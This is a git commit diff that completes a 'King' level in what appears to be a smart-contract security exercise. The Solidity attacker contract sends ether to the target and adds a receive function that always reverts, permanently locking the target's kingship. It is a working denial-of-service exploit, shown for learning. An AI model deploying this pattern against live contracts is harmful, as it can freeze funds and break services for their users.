84ec0a8ba1ebe487e900298fb4343b65baa642b1
Ricardo Pedroni <ricardo@endaoment.org>
2023-01-24 09:43:28 -0300

    complete level #5

--- contracts/5. King/AttackingKing.sol
+++ contracts/5. King/AttackingKing.sol
@@ -11,6 +11,14 @@ contract AttackingKing {
     }
 
     function hackContract() external {
-        // Code me!
+        // `call` so we forward enough gas
+        contractAddress.call{value: address(this).balance}("");
     }
+
+     receive() external payable {
+      // Gottem! When `King` transfers a value back to this contract, it will
+      // always revert. Since it uses `transfer`, an error is thrown and `King` does not check for this condition
+      // so it will always revert that transaction actual, effectively locking the king of the contract
+      revert("Now I am become death, the destroyer of worlds");
+     }
 }
